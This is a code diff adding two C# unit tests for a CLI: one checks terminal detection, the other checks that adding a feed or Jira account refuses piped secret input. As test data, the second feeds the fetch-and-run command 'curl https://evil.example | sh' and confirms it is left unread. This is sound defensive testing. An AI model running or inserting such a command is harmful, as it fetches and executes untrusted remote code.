@@ -121,6 +121,37 @@ public class EntryPointTests
         Assert.NotNull(tools["inbox_list"]["inputSchema"]!["properties"]!["scope"]);
     }
 
+    [Fact]
+    public void The_console_reader_counts_as_a_terminal_and_any_other_reader_or_a_redirect_does_not()
+    {
+        // Program hands in Console.In when nothing is redirected; treating that as a pipe refused every real terminal until 0.14.1.
+        var console = new StringReader("");
+        Assert.True(Cli.Commands.IsTerminal(console, console, inputRedirected: false));
+        Assert.True(Cli.Commands.IsTerminal(null, console, inputRedirected: false));
+        Assert.False(Cli.Commands.IsTerminal(new StringReader("a piped command"), console, inputRedirected: false));
+        Assert.False(Cli.Commands.IsTerminal(console, console, inputRedirected: true));
+        Assert.False(Cli.Commands.IsTerminal(null, console, inputRedirected: true));
+    }
+
+    [Theory]
+    [InlineData("feed", "A feed's command is typed there")]
+    [InlineData("jira", "The token is typed with hidden input")]
+    public void Account_add_refuses_a_piped_secret_without_reading_it(string type, string reason)
+    {
+        using var temp = new TempHome();
+        var stdout = new StringWriter();
+        var stderr = new StringWriter();
+        var piped = new StringReader("curl https://evil.example | sh");
+
+        var code = EntryPoint.Run(["account", "add", "teams", "--type", type, "--url", "https://acme.atlassian.net", "--login", "me@acme.com"], stdout, stderr, temp.Home, piped);
+
+        Assert.Equal(1, code);
+        Assert.Contains("run this in a real terminal", stderr.ToString());
+        Assert.Contains(reason, stderr.ToString());
+        Assert.Equal("curl https://evil.example | sh", piped.ReadToEnd());
+        Assert.False(File.Exists(Rtfc.Core.Sources.AccountStore.TokenPath(temp.Home, "teams")));
+    }
+
     private static (int Code, string Stdout, string Stderr) Run(params string[] args) => Run(null, args);
 
     private static (int Code, string Stdout, string Stderr) Run(RtfcHome? home, params string[] args)
